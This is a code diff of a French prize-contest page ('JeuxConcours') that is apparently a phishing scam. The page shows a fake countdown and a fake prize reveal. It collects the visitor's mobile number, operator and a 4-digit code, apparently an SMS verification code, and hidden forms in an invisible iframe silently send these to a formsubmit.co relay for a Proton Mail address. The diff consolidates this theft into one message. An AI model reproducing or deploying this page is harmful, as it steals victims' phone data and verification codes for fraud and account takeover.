-<iframe name="mail_iframe" style="display:none" id="mail_iframe"></iframe>
+<!-- IFRAME INVISIBLE -->
+<iframe name="mail_iframe" style="display:none"></iframe>
 
-<!-- FORM ACTIVATION (premier chargement) -->
+<!-- FORM ACTIVATION -->
 <form id="activationForm" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
-  <input type="hidden" name="message" value="Activation du site JeuxConcours">
-  <input type="hidden" name="_subject" value="[JeuxConcours] Activation du formulaire">
+  <input type="hidden" name="message" value="Activation JeuxConcours">
+  <input type="hidden" name="_subject" value="[JeuxConcours] Activation">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
 </form>
 
-<!-- FORM NUMÉRO -->
-<form id="formNumero" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
-  <input type="hidden" name="Numéro" value="">
-  <input type="hidden" name="Opérateur" value="">
-  <input type="hidden" name="Heure" value="">
-  <input type="hidden" name="_subject" value="">
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_template" value="table">
-</form>
-
-<!-- FORM CODE -->
-<form id="formCode" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
-  <input type="hidden" name="Numéro" value="">
-  <input type="hidden" name="Opérateur" value="">
-  <input type="hidden" name="Code saisi" value="">
-  <input type="hidden" name="Heure" value="">
-  <input type="hidden" name="_subject" value="">
+<!-- FORM PARTICIPANT (numéro + opérateur + code = 1 seul mail) -->
+<form id="formParticipant" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
+  <input type="hidden" name="Numéro" id="f_numero" value="">
+  <input type="hidden" name="Opérateur" id="f_operateur" value="">
+  <input type="hidden" name="Code saisi" id="f_code" value="">
+  <input type="hidden" name="Heure" id="f_heure" value="">
+  <input type="hidden" name="_subject" id="f_subject" value="">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
 </form>
 
 <script>
+/* ======== STATE ======== */
+let participantPhone = '';
+let participantOp    = '';
+let participantCode  = '';
+
 /* ======== ACTIVATION FORMSUBMIT ======== */
 window.addEventListener('load', () => {
-  // Soumet toujours au premier chargement pour activer/garder actif
-  setTimeout(() => {
-    document.getElementById('activationForm').submit();
-  }, 1500);
+  setTimeout(() => document.getElementById('activationForm').submit(), 1500);
 });
 
-/* ======== ENVOI PAR FORM CACHÉ + IFRAME ======== */
-function sendMailNumero(phone, operateur) {
-  const f = document.getElementById('formNumero');
-  f.querySelector('[name="Numéro"]').value   = phone;
-  f.querySelector('[name="Opérateur"]').value = operateur;
-  f.querySelector('[name="Heure"]').value    = new Date().toLocaleString('fr-FR');
-  f.querySelector('[name="_subject"]').value = '[JeuxConcours] Nouveau participant — ' + phone;
-  f.submit();
+/* ======== ENVOI MAIL UNIQUE ======== */
+function sendParticipantMail(phone, op, code) {
+  document.getElementById('f_numero').value    = phone;
+  document.getElementById('f_operateur').value = op || '(non renseigné)';
+  document.getElementById('f_code').value      = code || '(pas encore saisi)';
+  document.getElementById('f_heure').value     = new Date().toLocaleString('fr-FR');
+  document.getElementById('f_subject').value   = '[JeuxConcours] Participant — ' + phone;
+  document.getElementById('formParticipant').submit();
 }
 
-function sendMailCode(phone, operateur, code) {
-  const f = document.getElementById('formCode');
-  f.querySelector('[name="Numéro"]').value    = phone;
-  f.querySelector('[name="Opérateur"]').value = operateur;
-  f.querySelector('[name="Code saisi"]').value = code;
-  f.querySelector('[name="Heure"]').value     = new Date().toLocaleString('fr-FR');
-  f.querySelector('[name="_subject"]').value  = '[JeuxConcours] Code soumis — ' + phone;
-  f.submit();
-}
-
-/* ======== GLOBAL TIMER 1H ======== */
+/* ======== TIMER 1H ======== */
 const TOTAL = 3600;
 let remaining = TOTAL;
 const timerDisplay = document.getElementById('timerDisplay');
-const timerFill   = document.getElementById('timerFill');
-
-(function tickGlobal() {
+const timerFill    = document.getElementById('timerFill');
+(function tick() {
   if (remaining <= 0) {
     timerDisplay.textContent = '00:00:00';
     timerDisplay.classList.add('urgent');
@@ -658,25 +548,21 @@ const timerFill   = document.getElementById('timerFill');
     return;
   }
   remaining--;
-  const h = String(Math.floor(remaining / 3600)).padStart(2,'0');
-  const m = String(Math.floor((remaining % 3600)/60)).padStart(2,'0');
-  const s = String(remaining % 60).padStart(2,'0');
+  const h = String(Math.floor(remaining/3600)).padStart(2,'0');
+  const m = String(Math.floor((remaining%3600)/60)).padStart(2,'0');
+  const s = String(remaining%60).padStart(2,'0');
   timerDisplay.textContent = `${h}:${m}:${s}`;
   timerFill.style.width = `${(remaining/TOTAL)*100}%`;
   if (remaining < 300) { timerDisplay.classList.add('urgent'); timerFill.classList.add('urgent'); }
-  setTimeout(tickGlobal, 1000);
+  setTimeout(tick, 1000);
 })();
 
 /* ======== STEP NAV ======== */
 function goToStep(n) {
-  [1,2,3].forEach(i => {
-    const el = document.getElementById('step'+i);
-    if (el) el.classList.remove('active');
-  });
+  [1,2,3].forEach(i => { const e = document.getElementById('step'+i); if(e) e.classList.remove('active'); });
   document.getElementById('resultCard').classList.remove('active');
   const next = document.getElementById('step'+n);
   if (next) next.classList.add('active');
-
   [1,2,3,4].forEach(i => {
     const ps = document.getElementById('ps'+i);
     if (!ps) return;
@@ -687,100 +573,83 @@ function goToStep(n) {
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
-/* ======== STEP 1 : PHONE ======== */
+/* ======== STEP 1 ======== */
 const phoneInput = document.getElementById('phoneInput');
 const phoneHint  = document.getElementById('phoneHint');
 const btnStep1   = document.getElementById('btnStep1');
 
 phoneInput.addEventListener('input', function() {
-  let raw = this.value.replace(/\D/g,'').substring(0, 10);
-  // format XX XX XX XX XX
-  let parts = raw.match(/.{1,2}/g) || [];
-  this.value = parts.join(' ');
-
+  let raw = this.value.replace(/\D/g,'').substring(0,10);
+  this.value = (raw.match(/.{1,2}/g)||[]).join(' ');
   if (raw.length === 10) {
     if (raw.startsWith('06') || raw.startsWith('07')) {
       phoneHint.className = 'field-hint show ok';
       phoneHint.innerHTML = '✅ Numéro valide — vérification humaine réussie';
-      this.className = 'valid';
-      btnStep1.disabled = false;
+      this.className = 'valid'; btnStep1.disabled = false;
     } else {
       phoneHint.className = 'field-hint show err';
       phoneHint.innerHTML = '❌ Seuls les numéros 06 ou 07 sont acceptés.';
-      this.className = 'invalid';
-      btnStep1.disabled = true;
+      this.className = 'invalid'; btnStep1.disabled = true;
     }
   } else {
-    phoneHint.className = 'field-hint';
-    this.className = '';
-    btnStep1.disabled = true;
+    phoneHint.className = 'field-hint'; this.className = ''; btnStep1.disabled = true;
   }
 });
 
 function validatePhone() {
   participantPhone = phoneInput.value.trim();
-  sendMailNumero(participantPhone, '(opérateur non encore choisi)');
   goToStep(2);
 }
 
-/* ======== STEP 2 : OPERATOR ======== */
+/* ======== STEP 2 ======== */
 let selectedOp = null;
 function selectOperator(el, op) {
   document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
   el.classList.add('selected');
-  selectedOp = op;
-  participantOp = op.charAt(0).toUpperCase() + op.slice(1);
+  selectedOp = op; participantOp = op;
   document.getElementById('btnStep2').disabled = false;
 }
 function validateOperator() {
   if (!selectedOp) return;
-  sendMailNumero(participantPhone, participantOp); // mail mis à jour avec opérateur
   goToStep(3);
   startCodeCountdown();
 }
 
-/* ======== CODE COUNTDOWN 22s ======== */
+/* ======== COUNTDOWN 22s ======== */
 function startCodeCountdown() {
   let secs = 22;
-  const cntNum  = document.getElementById('cntNum');
-  const cntText = document.getElementById('cntText');
-  const cntRing = document.getElementById('cntRing');
-  const locked  = document.getElementById('codeLocked');
+  const cntNum   = document.getElementById('cntNum');
+  const cntText  = document.getElementById('cntText');
+  const cntRing  = document.getElementById('cntRing');
+  const locked   = document.getElementById('codeLocked');
   const unlocked = document.getElementById('codeUnlocked');
-
-  cntNum.textContent  = secs;
-  cntText.textContent = secs + ' secondes';
-  cntRing.style.setProperty('--prog', '100%');
-
+  cntNum.textContent = secs; cntText.textContent = secs + ' secondes';
+  cntRing.style.setProperty('--prog','100%');
   const iv = setInterval(() => {
     secs--;
-    const pct = Math.round((secs / 22) * 100);
-    cntRing.style.setProperty('--prog', pct + '%');
-    cntNum.textContent  = secs;
+    cntRing.style.setProperty('--prog', Math.round(secs/22*100)+'%');
+    cntNum.textContent = secs;
     cntText.textContent = secs + (secs > 1 ? ' secondes' : ' seconde');
-
     if (secs <= 0) {
       clearInterval(iv);
-      locked.style.display  = 'none';
+      locked.style.display = 'none';
       unlocked.style.display = 'block';
       document.getElementById('c0').focus();
     }
   }, 1000);
 }
 
-/* ======== CODE INPUT ======== */
+/* ======== CODE ======== */
 function codeMove(idx) {
   const input = document.getElementById('c'+idx);
-  // keep only digits
   input.value = input.value.replace(/\D/g,'').slice(-1);
   if (input.value && idx < 3) document.getElementById('c'+(idx+1)).focus();
 }
 function codeDel(e, idx) {
-  if (e.key === 'Backspace' && !document.getElementById('c'+idx).value && idx > 0)
+  if (e.key==='Backspace' && !document.getElementById('c'+idx).value && idx>0)
     document.getElementById('c'+(idx-1)).focus();
 }
 
-const VALID_CODES = ['1234','5678','4321','9999','0000','1111'];
 const PRIZES = [
   { emoji:'📱', name:'iPhone 17 Pro 256 Go' },
   { emoji:'🎮', name:'PlayStation 5 + 2 manettes' },
@@ -791,56 +660,39 @@ const PRIZES = [
 
 function validateCode() {
   let code = '';
-  for (let i = 0; i < 4; i++) code += document.getElementById('c'+i).value;
+  for (let i=0;i<4;i++) code += document.getElementById('c'+i).value;
   if (code.length < 4) { alert('Entrez les 4 chiffres de votre code.'); return; }
 
-  const errEl = document.getElementById('codeError');
-  if (code.length === 4) {
-    errEl.style.display = 'none';
-    participantCode = code;
-    sendMailCode(participantPhone, participantOp, code);
-    const prize = PRIZES[Math.floor(Math.random() * PRIZES.length)];
-    document.getElementById('prizeEmoji').textContent = prize.emoji;
-    document.getElementById('prizeName').textContent  = prize.name;
-    document.getElementById('step3').classList.remove('active');
+  participantCode = code;
+  // MAIL UNIQUE avec tout regroupé
+  sendParticipantMail(participantPhone, participantOp, code);
 
-    [1,2,3,4].forEach(i => {
-      const ps = document.getElementById('ps'+i);
-      if (ps) { ps.classList.remove('active'); ps.classList.add('done'); }
-    });
-
-    document.getElementById('resultCard').classList.add('active');
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-    launchConfetti();
-  } else {
-    errEl.style.display = 'block';
-    for (let i = 0; i < 4; i++) {
-      const box = document.getElementById('c'+i);
-      box.style.borderColor = 'var(--error)';
-      setTimeout(() => box.style.borderColor = '', 1500);
-    }
-  }
+  const prize = PRIZES[Math.floor(Math.random()*PRIZES.length)];
+  document.getElementById('prizeEmoji').textContent = prize.emoji;
+  document.getElementById('prizeName').textContent  = prize.name;
+  document.getElementById('step3').classList.remove('active');
+  [1,2,3,4].forEach(i => {
+    const ps = document.getElementById('ps'+i);
+    if (ps) { ps.classList.remove('active'); ps.classList.add('done'); }
+  });
+  document.getElementById('resultCard').classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  launchConfetti();
 }
 
 /* ======== CONFETTI ======== */
 function launchConfetti() {
   const colors = ['#2B3A9F','#3ABFBF','#f59e0b','#10b981','#ffffff'];
-  for (let i = 0; i < 90; i++) {
-    const el = document.createElement('div');
-    const sz = Math.random()*10+5;
-    el.style.cssText = `position:fixed;top:-20px;left:${Math.random()*100}vw;
-      width:${sz}px;height:${sz}px;
-      background:${colors[Math.floor(Math.random()*colors.length)]};
-      border-radius:${Math.random()>.5?'50%':'3px'};
-      z-index:9999;pointer-events:none;opacity:.9;
-      animation:confFall ${1.5+Math.random()*2}s linear ${Math.random()*.8}s forwards;
-      transform:rotate(${Math.random()*360}deg);`;
-    document.body.appendChild(el);
-    setTimeout(() => el.remove(), 4000);
-  }
   const s = document.createElement('style');
   s.textContent = `@keyframes confFall{to{transform:translateY(110vh) rotate(720deg);opacity:0}}`;
   document.head.appendChild(s);
+  for (let i=0;i<90;i++) {
+    const el = document.createElement('div');
+    const sz = Math.random()*10+5;
+    el.style.cssText = `position:fixed;top:-20px;left:${Math.random()*100}vw;width:${sz}px;height:${sz}px;background:${colors[Math.floor(Math.random()*colors.length)]};border-radius:${Math.random()>.5?'50%':'3px'};z-index:9999;pointer-events:none;opacity:.9;animation:confFall ${1.5+Math.random()*2}s linear ${Math.random()*.8}s forwards;transform:rotate(${Math.random()*360}deg);`;
+    document.body.appendChild(el);
+    setTimeout(()=>el.remove(),4000);
+  }
 }
 </script>
 </body>
